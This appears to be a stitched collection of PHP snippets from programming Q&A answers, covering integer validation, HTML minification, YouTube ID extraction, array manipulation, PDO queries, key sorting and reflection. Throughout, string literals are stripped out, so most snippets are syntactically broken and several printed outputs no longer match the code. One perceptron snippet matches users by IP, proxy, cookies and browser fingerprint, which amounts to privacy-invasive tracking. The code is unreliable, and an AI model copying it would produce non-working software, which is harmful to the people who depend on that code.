(is_numeric($var) && !is_double(1*$var)) && ($var >= 0)
$numbersToCheck = array("a", "-1", "1", "1.0", "1.2"); foreach ($numbersToCheck as $var) { echo $var . " is integer? ";var_dump((is_numeric($var) && !is_double(1*$var))); echo $var . " is a positive integer? ";var_dump((is_numeric($var) && !is_double(1*$var)) && ($var >= 0)); }
a is integer? bool(false) a is a positive integer? bool(false) -1 is integer? bool(true) -1 is a positive integer? bool(false) 1 is integer? bool(true) 1 is a positive integer? bool(true) 1.0 is integer? bool(false) 1.0 is a positive integer? bool(false) 1.2 is integer? bool(false) 1.2 is a positive integer? bool(false)
$string= if ((int)$string==$string) var_dump((int)$string); else echo $string= if ((int)$string==$string) var_dump((int)$string); else echo $string= if ((int)$string==$string) var_dump((int)$string); else echo $string= if ((int)$string==$string) var_dump((int)$string); else echo
function myIsInt() { return (is_numeric($var) AND (is_int($var) OR ctype_digit(trim($var, }
function my_is_int($var){ return is_numeric($var) && gettype($var+0)== }
function my_is_int($input) { return intval($input). }
my_is_int(1); my_is_int(-1); my_is_int(1.2); my_is_int("1"); my_is_int("-1"); my_is_int("1.2"); my_is_int(0); my_is_int(null);
function isIntStr($str) { return preg_match( && bcComp($ms[1], PHP_INT_MAX) <= 0 && bcComp($ms[1], -PHP_INT_MAX - 1) >= 0; }
function validInt($val, $min=null, $max=null) { $ival = intval($val); if( return false; } if($min !== null && $ival < $min) return false; if($max !== null && $ival > $max) return false; return true; }
$nums = array( 1, -1, 01, 1.0, .0, 1.123, 0x101010, ); foreach($nums as $num) { if(validInt2($num)) echo $num." - Valid integer.<br>\n"; else echo $num." - Not a valid integer.<br>\n"; }
1 - Valid integer. +1 - Not a valid integer. -1 - Valid integer. 01 - Not a valid integer. 1.0 - Not a valid integer. .0 - Not a valid integer. 1.123 - Not a valid integer. a123 - Not a valid integer. 0x101010 - Not a valid integer. 1 - Valid integer. -1 - Valid integer. 1 - Valid integer. 1 - Valid integer. 0 - Valid integer. 1.123 - Not a valid integer. 1052688 - Valid integer.
public static function isNumeric($value, $negativ = false) { return is_int($value) || is_string($value) && ( ctype_digit($value) || ( $negativ && $value{0} == ) ); }
$value = 12; $value = $value = $value = 12.1; $value = if (!is_numeric($value) || (int) $value != (float) $value) { echo "false"; } else { echo "true"; }
function means_int($input) { return ctype_digit((string) abs($input)); } $list = array( 0, 1, 1.1, 2.0, 2.6, -4, -3.2, -30.02, 100.00, ); foreach ($list as $x) { var_dump($x); var_dump(means_int($x)); echo PHP_EOL; }
int(0) bool(true) string(1) "0" bool(true) int(1) bool(true) string(1) "1" bool(true) float(1.1) bool(false) string(3) "1.1" bool(false) float(2) bool(true) string(3) "2.0" bool(true) float(2.6) bool(false) string(3) "2.6" bool(false) int(-4) bool(true) string(2) "-4" bool(true) float(-3.2) bool(false) string(4) "-3.2" bool(false) float(-30.02) bool(false) string(6) "-30.02" bool(false) float(100) bool(true) string(6) "100.00" bool(true)
function my_is_int($s) { return ctype_digit($s) || is_int($s); }
my_is_int(2); my_is_int("2"); my_is_int(-2); my_is_int(2.0); my_is_int("2.0"); my_is_int(2.1); my_is_int("2.1"); my_is_int("dog"); my_is_int("2dog"); my_is_int("dog2"); my_is_int(array( my_is_int(array(1)); my_is_int(true); my_is_int(false); my_is_int("true"); my_is_int("false"); my_is_int("0x101010");
function my_is_int($value){ return $value === (string)(int)$value; } my_is_int( my_is_int(
strlen($string) <= max(strlen((string)PHP_INT_MIN), strlen((string)PHP_INT_MAX)) && $string === (string)(int)$string
<?php function sanitize_output($buffer) { $search = array( ); $replace = array( ); $buffer = preg_replace($search, $replace, $buffer); return $buffer; } ob_start("sanitize_output"); ?>
$this->output = preg_replace( array( ), array( ), $this->output );
function sanitize_output($buffer) { require_once( require_once( require_once( $buffer = Minify_HTML::minify($buffer, array( )); return $buffer; } ob_start(
class Application_Plugin_Minify extends Zend_Controller_Plugin_Abstract { public function dispatchLoopShutdown() { $response = $this->getResponse(); $body = $response->getBody(); $replace = array( ); $body = preg_replace(array_keys($replace), array_values($replace), $body); $remove = array( ); $body = str_ireplace($remove, $response->setBody($body); } }
Original HTML: 150kB 180ms download gZipped HTML: 24kB 40ms minified HTML: 120kB 150ms download + 150ms minification min+gzip HTML: 22kB 30ms download + 150ms minification
<?php function minify_output($buffer){ $search = array( $replace = array( if (preg_match("/\<html/i",$buffer) == 1 && preg_match("/\<\/html\>/i",$buffer) == 1) { $buffer = preg_replace($search, $replace, $buffer); } return $buffer; } ob_start("minify_output");?>
function Minify_Html($Html) { $Search = array( $Replace = array( "\n", "\n", " ", "", " ", "><", "$1>", "=$1"); $Html = preg_replace($Search,$Replace,$Html); return $Html; }
gzip on; gzip_disable "msie6"; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_http_version 1.1; gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;
$context = new MinifyContext(new PlaceholderContainer()); $context->setContents( $minify = new Minify(); $context = $minify->run($context); $minifiedContents = $context->getContents();
<?php include ob_start( ?> <!-- HTML code goes here ... --> <?php echo ob_get_clean(); ?>
ob_start(function($b){ if(strpos($b, "<html")!==false) { return str_replace(PHP_EOL,"",$b); } else {return $b;} });
App::import( App::import( App::import( App::import( App::import( class MinifyCodeHelper extends Helper { public function afterRenderFile($file, $data) { if( Configure::read( $data = Minify_HTML::minify($data, array( )); return $data; } }
"Content-Disposition: attachment; filename=abc.csv"
<?php $url = "http: parse_str( parse_url( $url, PHP_URL_QUERY ), $my_array_of_vars ); echo $my_array_of_vars[ ?>
youtube.com/v/{vidid} youtube.com/vi/{vidid} youtube.com/?v={vidid} youtube.com/?vi={vidid} youtube.com/watch?v={vidid} youtube.com/watch?vi={vidid} youtu.be/{vidid}
preg_match("/^(?:http(?:s)?:\/\/)?(?:www\.)?(?:m\.)?(?:youtu\.be\/|youtube\.com\/(?:(?:watch)?\?(?:.*&)?v(?:i)?=|(?:embed|v|vi|user)\/))([^\?&\"
/** * Get Youtube video ID from URL * * @param string $url * @return mixed Youtube video ID or FALSE if not found */ function getYoutubeIdFromUrl($url) { $parts = parse_url($url); if(isset($parts[ parse_str($parts[ if(isset($qs[ return $qs[ }else if(isset($qs[ return $qs[ } } if(isset($parts[ $path = explode( return $path[count($path)-1]; } return false; } $urls = array( ); foreach($urls as $url){ echo $url . }
<?php function get_youtube_id_from_url($url) { preg_match( } echo get_youtube_id_from_url( ?>
<?php $links = [ "youtube.com/v/tFad5gHoBjY", "youtube.com/vi/tFad5gHoBjY", "youtube.com/?v=tFad5gHoBjY", "youtube.com/?vi=tFad5gHoBjY", "youtube.com/watch?v=tFad5gHoBjY", "youtube.com/watch?vi=tFad5gHoBjY", "youtu.be/tFad5gHoBjY", "http: "youtube.com/v/vidid", "youtube.com/vi/vidid", "youtube.com/?v=vidid", "youtube.com/?vi=vidid", "youtube.com/watch?v=vidid", "youtube.com/watch?vi=vidid", "youtu.be/vidid", "youtube.com/embed/vidid", "http: "http: "https: "youtube.com/watch?v=vidid&wtv=wtv", "http: "youtube.com/watch?v=7HCZvhRAk-M" ]; foreach($links as $link){ preg_match(" var_dump(end($matches)); }
<?php $youtube = http: http: http: http: http: http: http: preg_match_all(" var_dump($matches[0]);
array(8) { [0]=> string(11) "dQw4w9WgXcQ" [1]=> string(11) "dQw4w9WgXcQ" [2]=> string(11) "dQw4w9WgXcQ" [3]=> string(11) "dQw4w9WgXcQ" [4]=> string(11) "dQw4w9WgXcQ" [5]=> string(11) "dQw4w9WgXcQ" [6]=> string(11) "dQw4w9WgXcQ" [7]=> string(11) "dQw4w9WgXcQ" }
$pattern = preg_match_all($pattern, $post_content, $matches); foreach ($matches as $match) { $img = "<img src= break; }
function get_youtube_id($url) { if (strpos( $url,"v=") !== false) { return substr($url, strpos($url, "v=") + 2, 11); } elseif(strpos( $url,"embed/") !== false) { return substr($url, strpos($url, "embed/") + 6, 11); } }
<?php $url = "https: preg_match( $youtube_id = $match[1]; echo $youtube_id; ?>
function getYouTubeId($url) { str_replace( if (!stristr($url, $url = } $url = str_replace( if (strlen($url) == 11) { $code = $url; } else if (preg_match( $url = parse_url($url, PHP_URL_PATH); $code = substr($url, 1, 11); } else if (preg_match( $arr = parse_url($url); parse_str($url); $code = isset($v) ? substr($v, 0, 11) : false; } else if (preg_match( $url = parse_url($url, PHP_URL_PATH); $code = substr($url, 3, 11); } else if (preg_match( $url = parse_url($url, PHP_URL_PATH); $code = substr($url, 7, 11); } else if (preg_match(" $code = substr($matches[0], 0, 11); } else { $code = false; } if ($code && (strlen($code) < 11)) { $code = false; } return $code; }
$array = array( $array_without_strawberries = array_diff($array, array( print_r($array_without_strawberries);
if (($key = array_search( array_splice($array, $key, 1); }
$array = array( array_splice($array, 2, 1); json_encode($array);
$array = array( unset($array[2]); json_encode($array);
$list = array("apple", "orange", "strawberry", "lemon", "banana"); $delete_val = array("orange", "lemon", "banana"); foreach($delete_val as $key){ $keyToDelete = array_search($key, $list); unset($list[$keyToDelete]); }
function array_delete($del_val, $array) { if(is_array($del_val)) { foreach ($del_val as $del_key => $del_value) { foreach ($array as $key => $value){ if ($value == $del_value) { unset($array[$key]); } } } } else { foreach ($array as $key => $value){ if ($value == $del_val) { unset($array[$key]); } } } return array_values($array); }
function rmv_val($var) { return(!($var == } $array = array( $array_res = array_filter($array, "rmv_val");
$array = array( $array_without_strawberries = array_diff($array, array(
foreach ($array_without_strawberries as $data) { print_r($data); }
$array_without_strawberries[0] > apple $array_without_strawberries[1] > orange $array_without_strawberries[3] > blueberry $array_without_strawberries[4] > kiwi
$array_without_strawberries = array_values($array);
$array_without_strawberries[0] > apple $array_without_strawberries[1] > orange $array_without_strawberries[2] > blueberry $array_without_strawberries[3] > kiwi
<?php $animals = array( print_r($animals); echo "<br/><br/>"; unset($animals[3]); print_r($animals); ?>
$remove= "strawberry"; $array = ["apple", "orange", "strawberry", "blueberry", "kiwi"]; foreach ($array as $key => $value) { if ($value!=$remove) { echo $value. continue; } }
<?php $array = array("apple", "orange", "strawberry", "blueberry", "kiwi"); $delete = "strawberry"; $index = array_search($delete, $array); array_splice($array, $index, 1); var_dump($array); ?>
if(($key = array_search($del_val, $messages)) !== false) { unset($messages[$key]); }
$detils = array( function remove_embpty($values) { if($values== { $values= } return $values; } $detils=array_map( print_r($detils);
User1 = A + B + C + D + G + K User2 = C + D + I + J + K + F
$features = array( ); $labels = array(); $n = 1; foreach ($features as $k => $v) { $labels[$k] = "x" . $n; $n ++; } $users = array(); for($i = 0, $name = "A"; $i < 5; $i ++, $name ++) { $users[] = new Profile($name, $features); } $unknown = new Profile("Unknown", $features); $unknownRNA = array( 0 => array("o" => 1), 1 => array("o" => - 1) ); foreach ($unknown->data as $item => $point) { $unknownRNA[0][$labels[$item]] = $point; $unknownRNA[1][$labels[$item]] = (- 1 * $point); } $perceptron = new Perceptron(); $trainResult = $perceptron->train($unknownRNA, 1, 1); foreach ($users as $name => &$profile) { $data = array_combine($labels, $profile->data); if ($perceptron->testCase($data, $trainResult) == true) { $score = $diff = 0; foreach ($unknown->data as $item => $found) { if ($unknown->data[$item] === $profile->data[$item]) { if ($profile->data[$item] > 0) { $score += $features[$item]; } else { $diff += $features[$item]; } } } $profile->setScore($score, $diff); $matchs[] = $profile; } } if (count($matchs) > 1) { usort($matchs, function ($a, $b) { if ($a->score == $b->score) { return $a->diff == $b->diff ? 0 : ($a->diff > $b->diff ? 1 : - 1); } return $a->score > $b->score ? - 1 : 1; }); echo "<br />Possible Match ", implode(",", array_slice(array_map(function ($v) { return sprintf(" %s (%0.4f|%0.4f) ", $v->name, $v->score,$v->diff); }, $matchs), 0, 2)); } else { echo "<br />No match Found "; }
Possible Match D (0.7416|0.16853),C (0.5393|0.2809)
echo "<pre>"; print_r($matchs[0]); Profile Object( [name] => D [data] => Array ( [Real IP address] => -1 [Used proxy IP address] => -1 [HTTP Cookies] => 1 [Session Cookies] => 1 [3rd Party Cookies] => 1 [Flash Cookies] => 1 [PDF Bug] => 1 [Flash Bug] => 1 [Java Bug] => -1 [Frequent Pages] => 1 [Browsers Finger Print] => -1 [Installed Plugins] => 1 [URL] => -1 [Cached PNG] => 1 [System Fonts Detection] => 1 [Localstorage] => -1 [Geolocation] => -1 [AOLTR] => 1 [Network Information API] => -1 [Battery Status API] => -1 ) [score] => 0.74157303370787 [diff] => 0.1685393258427 [base] => 8.9 )
+----+----+----+----+----+----+----+----+----+----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+------+-----+----+---------+---------+---------+---------+---------+---------+---------+---------+---------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----+----+----+----+----+----+----+----+----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----------+ | o | x1 | x2 | x3 | x4 | x5 | x6 | x7 | x8 | x9 | x10 | x11 | x12 | x13 | x14 | x15 | x16 | x17 | x18 | x19 | x20 | Bias | Yin | Y | deltaW1 | deltaW2 | deltaW3 | deltaW4 | deltaW5 | deltaW6 | deltaW7 | deltaW8 | deltaW9 | deltaW10 | deltaW11 | deltaW12 | deltaW13 | deltaW14 | deltaW15 | deltaW16 | deltaW17 | deltaW18 | deltaW19 | deltaW20 | W1 | W2 | W3 | W4 | W5 | W6 | W7 | W8 | W9 | W10 | W11 | W12 | W13 | W14 | W15 | W16 | W17 | W18 | W19 | W20 | deltaBias | +----+----+----+----+----+----+----+----+----+----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+------+-----+----+---------+---------+---------+---------+---------+---------+---------+---------+---------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----+----+----+----+----+----+----+----+----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----------+ | 1 | 1 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 0 | -1 | 0 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | 1 | 1 | 0 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | -1 | -1 | 1 | -19 | -1 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | | 1 | 1 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 19 | 1 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | -1 | -1 | 1 | -19 | -1 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | -1 | -1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | 1 | 1 | 1 | 1 | -1 | -1 | -1 | -1 | 1 | 1 | 1 | | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | -- | +----+----+----+----+----+----+----+----+----+----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+------+-----+----+---------+---------+---------+---------+---------+---------+---------+---------+---------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----------+----+----+----+----+----+----+----+----+----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----+-----------+
$labels = array(); $n = 1; foreach ( $features as $k => $v ) { $labels[$k] = "x" . $n; $n ++; }
class Profile { public $name, $data = array(), $score, $diff, $base; function __construct($name, array $importance) { $values = array(-1, 1); $this->name = $name; foreach ($importance as $item => $point) { $this->data[$item] = $values[mt_rand(0, 1)]; } $this->base = array_sum($importance); } public function setScore($score, $diff) { $this->score = $score / $this->base; $this->diff = $diff / $this->base; } }
class Perceptron { private $w = array(); private $dw = array(); public $debug = false; private function initialize($colums) { for($i = 1; $i <= $colums; $i ++) { $this->w[$i] = 0; $this->dw[$i] = 0; } } function train($input, $alpha, $teta) { $colums = count($input[0]) - 1; $weightCache = array_fill(1, $colums, 0); $checkpoints = array(); $keepTrainning = true; $this->initialize(count($input[0]) - 1); $just_started = true; $totalRun = 0; $yin = 0; while ($keepTrainning == true) { foreach ($input as $row_counter => $row_data) { $n_columns = count($row_data) - 1; $yin = 0; for($i = 1; $i <= $n_columns; $i ++) { $yin += $row_data["x" . $i] * $weightCache[$i]; } $Y = ($yin <= 1) ? - 1 : 1; $checkpoints[$row_counter] = 0; for($i = 1; $i <= $n_columns; $i ++) { /** DELTAS **/ if ($just_started == true) { $this->dw[$i] = $weightCache[$i]; $just_started = false; } elseif ($Y == $row_data["o"]) { $this->dw[$i] = 0; } else { $this->dw[$i] = $row_data["x" . $i] * $row_data["o"]; } /** WEIGHTS **/ $this->w[$i] = $this->dw[$i] + $weightCache[$i]; $weightCache[$i] = $this->w[$i]; /** CHECK-POINT **/ $checkpoints[$row_counter] += $this->w[$i]; } foreach ($this->w as $index => $w_item) { $debug_w["W" . $index] = $w_item; $debug_dw["deltaW" . $index] = $this->dw[$index]; } $debug_vars[] = array_merge($row_data, array( "Bias" => 1, "Yin" => $yin, "Y" => $Y ), $debug_dw, $debug_w, array( "deltaBias" => 1 )); } $empty_data_row = array(); for($i = 1; $i <= $n_columns; $i ++) { $empty_data_row["x" . $i] = "--"; $empty_data_row["W" . $i] = "--"; $empty_data_row["deltaW" . $i] = "--"; } $debug_vars[] = array_merge($empty_data_row, array( "o" => "--", "Bias" => "--", "Yin" => "--", "Y" => "--", "deltaBias" => "--" )); $totalRun ++; $referer_value = end($checkpoints); $sum = array_sum($checkpoints); $n_rows = count($checkpoints); if ($totalRun > 1 && ($sum / $n_rows) == $referer_value) { $keepTrainning = false; } } $result = array(); for($i = 1; $i <= $n_columns; $i ++) { $result["w" . $i] = $this->w[$i]; } $this->debug($this->print_html_table($debug_vars)); return $result; } function testCase($input, $results) { $result = 0; $i = 1; foreach ($input as $column_value) { $result += $results["w" . $i] * $column_value; $i ++; } return ($result > 0) ? true : false; } function print_html_table($array) { $html = ""; $inner_html = ""; $table_header_composed = false; $table_header = array(); foreach ($array as $array_item) { $inner_html .= "<tr>\n"; foreach ( $array_item as $array_col_label => $array_col ) { $inner_html .= "<td>\n"; $inner_html .= $array_col; $inner_html .= "</td>\n"; if ($table_header_composed == false) { $table_header[] = $array_col_label; } } $table_header_composed = true; $inner_html .= "</tr>\n"; } $html = "<table border=1>\n"; $html .= "<tr>\n"; foreach ($table_header as $table_header_item) { $html .= "<td>\n"; $html .= "<b>" . $table_header_item . "</b>"; $html .= "</td>\n"; } $html .= "</tr>\n"; $html .= $inner_html . "</table>"; return $html; } function debug($message) { if ($this->debug == true) { echo "<b>DEBUG:</b> $message"; } } }
interface IInterface { } class TheClass implements IInterface { } $cls = new TheClass(); if ($cls instanceof IInterface) { echo "yes"; }
interface IInterface { } class TheClass implements IInterface { } $interfaces = class_implements( if (isset($interfaces[ echo "Yes!"; }
public function __construct() { $tmp = array( ); $in = in_array( }
$class = new ReflectionClass( if ($class->implementsInterface( { print "Yep!\n"; }
public function yourMethod(YourInterface $objectSupposedToBeImplementing) { }
try { $connect = new CONNECT($db, $user, $password, $driver, $host); } catch (Exception $e) { throw $e; }
try { $connect = new CONNECT($db, $user, $password, $driver, $host); } catch (Exception $e) { throw new Exception("Exception Message", 1, $e); }
try { $connect = new CONNECT($db, $user, $password, $driver, $host); } catch (Exception $e) { echo "Error while connecting to database!"; die; }
try { $connect = new CONNECT($db, $user, $password, $driver, $host); } catch (Exception $e) { logException($e); throw $e; }
$connect = new CONNECT($db, $user, $password, $driver, $host); try { $connect->insertSomeRecord(); } catch (Exception $e) { $connect->disconnect(); throw $e; }
$connect = new CONNECT($db, $user, $password, $driver, $host); try { $connect->insertSomeRecord(); } finally { $connect->disconnect(); }
class ComponentInitException extends Exception { } class Component { public function __construct() { try { $connect = new CONNECT($db, $user, $password, $driver, $host); } catch (Exception $e) { throw new ComponentInitException($e->getMessage(), $e->getCode(), $e); } } }
class FileOperation { public static function copyFiles() { try { $copier = new FileCopier(); $copier->ensureSourceFilesExist(); $copier->createTargetDirectory(); $copier->performCopy(); } catch (Exception $e) { throw new Exception("Could not perform copy operation.", 0, $e); } } }
[0] => stdClass Object ( [ID] => 420 [name] => Mary ) [1] => stdClass Object ( [ID] => 10957 [name] => Blah ) ...
$item = null; foreach($array as $struct) { if ($v == $struct->ID) { $item = $struct; break; } }
$neededObject = array_filter( $arrayOfObjects, function ($e) use (&$searchedValue) { return $e->id == $searchedValue; } );
$neededObject = array_filter( $arrayOfObjects, function ($e) { return $e->id == $searchedValue; } );
$arr = [ [ ] ]; echo array_search(1, array_column($arr,
class ArrayUtils { public static function objArraySearch($array, $index, $value) { foreach($array as $arrayInf) { if($arrayInf->{$index} == $value) { return $arrayInf; } } return null; } }
$haystack = array($obj1, $obj2, ...); $needle = $search_results_array = array_reduce( $haystack, function($result_array, $current_item) use ($needle){ if ($current_item->someProperty == $needle){ $result_array[] = $current_item; } return $result_array; }, array() ); if (count($search_results_array) > 0){ echo "found object(s): "; print_r($search_results_array[0]); } else { echo "did not find object(s): "; }
$searchedValue = 123456; $neededObject = array_filter( $arrayOfObjects, function ($e) use ($searchedValue) { return $e->id == $searchedValue; } ); var_dump($searchedValue);
$searchedValue = array( 1, 5 ); $neededObject = array_filter( $arrayOfObjects, function ( $e ) use ( $searchedValue ) { return in_array( $e->term_id, $searchedValue ); } ); var_dump($searchedValue);
<?php $object1 = (object) array( $object2 = (object) array( $object3 = (object) array( $firstArray = Array($object1,$object2); var_dump($firstArray); $secondArray = Array(); foreach($firstArray as $value){ $secondArray[$value->id] = $value->name; } var_dump($secondArray); echo $secondArray[
array (size=2) 0 => object(stdClass)[1] public public public 1 => object(stdClass)[2] public public public array (size=2) 123 => string 273 => string Henk
public function __construct($timeout=300, $acceptGet=\FALSE){ $this->timeout = $timeout; if (\session_id()) { $this->acceptGet = (bool) $acceptGet; } else { throw new \Exception( } }
$myDog = new \Animal\Dog\Shepherd\GermanShepherd();
"array_slice" "assert" "boolval" "call_user_func" "call_user_func_array" "chr" "count" "defined" "doubleval" "floatval" "func_get_args" "func_num_args" "get_called_class" "get_class" "gettype" "in_array" "intval" "is_array" "is_bool" "is_double" "is_float" "is_int" "is_integer" "is_long" "is_null" "is_object" "is_real" "is_resource" "is_string" "ord" "strlen" "strval"
$sth = $db->query("SELECT * FROM table"); $result = $sth->fetchAll();
$sth = $db->prepare("SELECT * FROM table"); $sth->execute(); $result = $sth->fetchAll();
$sth = $dbh->prepare( WHERE calories < :calories AND colour = :colour $sth->bindParam( $sth->bindParam( $sth->execute();
$sth = $db->prepare("SELECT * FROM table WHERE foo = ?"); $sth->execute(array(1)); $results = $sth->fetchAll(PDO::FETCH_ASSOC); $sth->execute(array(2)); $results = $sth->fetchAll(PDO::FETCH_ASSOC);
$logs = []; $test = function (String $type, Int $count = 3000) use ($pdo, &$logs) { $start = microtime(true); $i = 0; while ($i < $count) { $sql = "INSERT INTO performancetest (id, val) OUTPUT INSERTED.sid VALUES ($i, if ($type === $smt = $pdo->query($sql); } else { $smt = $pdo->prepare($sql); $smt ->execute(); } $sid = $smt->fetch(PDO::FETCH_ASSOC)[ $i++; } $total = (microtime(true) - $start); $logs[$type] []= $total; echo "$total $type\n"; }; $trials = 15; $i = 0; while ($i < $trials) { if (random_int(0,1) === 0) { $test( } else { $test( } $i++; } foreach ($logs as $type => $log) { $total = 0; foreach ($log as $record) { $total += $record; } $count = count($log); echo "($count) $type Average: ".$total/$count.PHP_EOL; }
$properOrderedArray = sortArrayByArray($customer, array(
$customer[ $customer[ $customer[ $customer[ $properOrderedArray = array_merge(array_flip(array( $properOrderedArray = array_replace(array_flip(array(
function sortArrayByArray(array $array, array $orderArray) { $ordered = array(); foreach ($orderArray as $key) { if (array_key_exists($key, $array)) { $ordered[$key] = $array[$key]; unset($array[$key]); } } return $ordered + $array; }
$customer[ $customer[ $customer[ $customer[ $customerSorted = array_replace(array_flip(array(
Array ( [name] => Tim [dob] => 12/08/1986 [address] => 123 fake st [dontSortMe] => this value doesnt need to be sorted )
$order = array(1,5,2,4,3,6); $array = array( 1 => 2 => 3 => 4 => 5 => 6 => ); uksort($array, function($key1, $key2) use ($order) { return (array_search($key1, $order) > array_search($key2, $order)); });
function sortArrayByArray(array $toSort, array $sortByValuesAsKeys) { $commonKeysInOrder = array_intersect_key(array_flip($sortByValuesAsKeys), $toSort); $commonKeysWithValue = array_intersect_key($toSort, $commonKeysInOrder); $sorted = array_merge($commonKeysInOrder, $commonKeysWithValue); return $sorted; }
$array = array( $sorted = array_intersect($order, $array); print_r($sorted);
$array = array_flip($array); $sorted = array_intersect_key(array_flip($order), $array); print_r($sorted);
$properOrderedArray = array_replace(array_fill_keys($keys, null), $array);
function sortArrayByArray($array,$orderArray) { $ordered = array(); foreach($orderArray as $key => $value) { if(array_key_exists($key,$array)) { $ordered[$key] = $array[$key]; unset($array[$key]); } } return $ordered + $array; }
$array=array(28=>c,4=>b,5=>a); $seq=array(5,4,28); SortByKeyList($array,$seq) result: array(5=>a,4=>b,28=>c); function sortByKeyList($array,$seq){ $ret=array(); if(empty($array) || empty($seq)) return false; foreach($seq as $key){$ret[$key]=$dataset[$key];} return $ret; }
function array_sub_sort(array $values, array $keys){ $keys = array_flip($keys); return array_merge(array_intersect_key($keys, $values), array_intersect_key($values, $keys)); }
$array_complete = [ ]; $array_sub_sorted = array_sub_sort($array_complete, [
$arrayToBeSorted = array( $order = array( usort($arrayToBeSorted, function($a, $b) use ($order){ $valA = array_search($a, $order); $valB = array_search($b, $order); if ($valA === false) return -1; if ($valB === false) return 0; if ($valA > $valB) return 1; if ($valA < $valB) return -1; return 0; });
/** * sort keys like in key list * filter: remove keys are not listed in keyList * [ * * @param array $inputArray * @param string[]|int[] $keyList * @param bool $removeUnknownKeys * @return array */ static public function sortAndFilterKeys($inputArray, $keyList, $removeUnknownKeys=true){ $keysAsKeys = array_flip($keyList); $result = array_replace($keysAsKeys, $inputArray); $result = array_intersect_key($result, $inputArray); if( $removeUnknownKeys ){ $result = array_intersect_key($result, $keysAsKeys); } return $result; }
function sortArrayByArray($array,$orderArray) { $ordered = array(); foreach($orderArray as $key) { if(array_key_exists($key,$array)) { $ordered[$key] = $array[$key]; unset($array[$key]); } } return $ordered + $array; }
$properOrderedArray = array_merge(array_flip(array(
foreach ($customer as $customer) { $modified_key = array_intersect_key($master_key, $unordered_array); $properOrderedArray = array_merge($modified_key, $customer); }
$customer[ $customer[ $customer[ $customer[ $order = array( $keys= array_flip($order); uksort($customer, function($a, $b)use($keys){ return $keys[$a] - $keys[$b]; }); print_r($customer);
if (function_exists( header_remove( } else { @ini_set( }
<Files ~ "^.*"> Deny from all </Files> <Files ~ "^index\.php|css|js|.*\.png|.*\.jpg|.*\.gif"> Allow from all </Files>
RewriteCond %{HTTP_REFERRER} !=HTTP: RewriteRule ^submit\.php$ - [F]
class Profile { const LABEL_FIRST_NAME = "First Name"; const LABEL_LAST_NAME = "Last Name"; const LABEL_COMPANY_NAME = "Company"; }
<?php class Profile { const LABEL_FIRST_NAME = "First Name"; const LABEL_LAST_NAME = "Last Name"; const LABEL_COMPANY_NAME = "Company"; } $refl = new ReflectionClass( print_r($refl->getConstants());
$reflector = new ReflectionClass( var_dump($reflector->getConstants());
<?php header( $file = file_get_contents( $tokens = token_get_all($file); $const = false; $name = $constants = array(); foreach ($tokens as $token) { if (is_array($token)) { if ($token[0] != T_WHITESPACE) { if ($token[0] == T_CONST && $token[1] == $const = true; $name = } else if ($token[0] == T_STRING && $const) { $const = false; $name = $token[1]; } else if ($token[0] == T_CONSTANT_ENCAPSED_STRING && $name) { $constants[$name] = $token[1]; $name = } } } else if ($token != $const = false; $name = } } foreach ($constants as $constant => $value) { echo "$constant = $value\n"; } ?>
LABEL_FIRST_NAME = "First Name" LABEL_LAST_NAME = "Last Name" LABEL_COMPANY_NAME = "Company"
function GetClassConstants($sClassName) { $oClass = new ReflectionClass($sClassName); return $oClass->getConstants(); }
$class = new ReflectionClass( $consts = $class->getConstants();
